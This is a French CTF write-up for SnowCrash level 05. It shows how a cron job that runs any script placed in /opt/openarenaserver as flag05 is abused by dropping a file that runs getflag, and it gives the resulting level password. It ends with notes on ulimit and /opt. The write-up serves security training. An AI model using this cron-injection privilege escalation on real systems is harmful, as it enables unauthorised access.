LEVEL 05

------------------------------------------------------------------------------------------------------------------------

    find . -user level05 2> /dev/null | grep -v proc
                 flag05
    find . -perm /u=s,g=s

* Recherches


    Pareil, lors de l'analyse global, on avait trouvé : 
    ls -la /var/mail
    -rw-r--r--+ 1 root mail  58 Dec 21 21:27 level05
    cat /var/mail/level05
    */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

    Ca ressemble fortement à une crontab
    level05@SnowCrash:/$ crontab
    ^Clevel05@SnowCrash:/$ crontab -l
    no crontab for level05
    level05@SnowCrash:/$ crontab -u flag05
    must be privileged to use -u

    On a aucun droit mais on devine que la crontab pourra trigger le getflag
    
    La crontab s'execute every 2nd minute (https://crontab.guru/#*/2_*_*_*_*)

    Via find . -user flag05 2> /dev/null | grep -v proc
        ./usr/sbin/openarenaserver
        ./rofs/usr/sbin/openarenaserver

    Allons voir dans /usr/sbin/
    ll
    -rwxr-x---+ 1 flag05  flag05      94 Mar  5  2016 openarenaserver*

    cat openarenaserver         --> Pourquoi arrive-t-on a le cat en tant qu'user level05 vu les droits ?
        
        #!/bin/sh
        for i in /opt/openarenaserver/* ; do
            (ulimit -t 5; bash -x "$i")
            rm -f "$i"
        done
    
    cd /opt/openarenaserver
    On voit qu'il itère sur les fichiers dans /opt/openarenaserver/*, avant de les rm -rf
    On créer un fichier dans /opt/openarenaserver dans lequel on écrit par exemple "getflag"
    sh openarenaserver depuis /usr/bin executé le contenu du fichier
    Mais pas de token

    Il faut attendre que la crontab execute le script shell toutes les 2 minutes, et donc echo le getflag dans un fichier, par exemple dans tmp

* Solution

    cat /var/mail/level05
    */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
    La crontab s'execute every 2nd minute (https://crontab.guru/#*/2_*_*_*_*)

    cat openarenaserver
        
        #!/bin/sh
        for i in /opt/openarenaserver/* ; do
            (ulimit -t 5; bash -x "$i")
            rm -f "$i"
        done

    La crontab execute toutes les 2 minutes ce script, en tant que flag05 à priori

    echo "getflag > /tmp/flag" > xFile          (dans /opt/openarenaserver)
    Attendre 2 minutes max que la crontab s'execute
    cat /tmp/flag viuaaale9huek52boumoomioc
    su level06 viuaaale9huek52boumoomioc


------------------------------------------------------------------------------------------------------------------------

NB : 

Difference between /opt and /usr/local? : While both are designed to contain files not belonging to the operating system, /opt and /usr/local are not intended to contain the same set of files.

- /usr/local is a place to install files built by the administrator

- On the other hand, /opt is a directory for installing unbundled packages
  (i.e. packages not part of the Operating System distribution, but provided by an independent source) each one in its own subdirectory. T


NB2 :

Les limites sont des niveaux maximum acceptés par le système concernant la gestion des ressources. Il est possible d’afficher ces valeurs actuellement settées pour l’utilisateur courant grâce à la commande:

$ ulimit -a

En deuxième colonne, vous avez l’unité de mesure de la limite, et son raccourci, qui nous servira à allouer et afficher des limites spécifiques


core file size          (blocks, -c) 0
data seg size           (kbytes, -d) unlimited
scheduling priority             (-e) 0
file size               (blocks, -f) unlimited
pending signals                 (-i) 7873
max locked memory       (kbytes, -l) 64
max memory size         (kbytes, -m) unlimited
open files                      (-n) 1024
pipe size            (512 bytes, -p) 8
POSIX message queues     (bytes, -q) 819200
real-time priority              (-r) 0
stack size              (kbytes, -s) 8192
cpu time               (seconds, -t) 5
max user processes              (-u) 7873
virtual memory          (kbytes, -v) unlimited
file locks                      (-x) unlimited

- File Size : Il s’agit là de la taille maximale de fichier qu’un utilisateur peut créer. La valeur est exprimée en kB et est bien sûr illimitée par défaut.

- Open Files : Le nombre de fichiers qu’un utilisateur peut ouvrir via ses processus. La valeur de 1024 par défaut est parfois dépassée par certaines grosses applications, ce qui mène à un crash sans pitié. C’est un des rares cas où l’ont va plutôt chercher à agrandir la valeur plutôt que de la limiter.

- CPU Time : Le temps cpu accordé à l’utilisateur et aux processus qu’il pourra lancer. Celui-ci est compté en secondes. Une fois que ce temps processeur est dépassé, le shell de l’utilisateur est sauvagement fermé via un kill. Pour plus d’infos sur le CPU Time, il y a un grand article de qualité qui en parle ici ! :-P

- Max User Processes : Le nombre maximum de processus acceptés simultanément pour un user. Peut être utile si vous êtes très paranoïaque (peut par exemple prévenir les Fork Bomb).

- Virtual Memory : Même s’il y a trois valeurs gérant la mémoire allouée, vous pouvez ne penser qu’à celle-ci. Il correspond à l’onglet VIRT dans le tableau de top. Là encore, mon article sur top pourrait vous intéresser.


- ROFS

Rofs is a read-only filesystem that allows you to create a read-only mountpoint of a read-write directory on your system.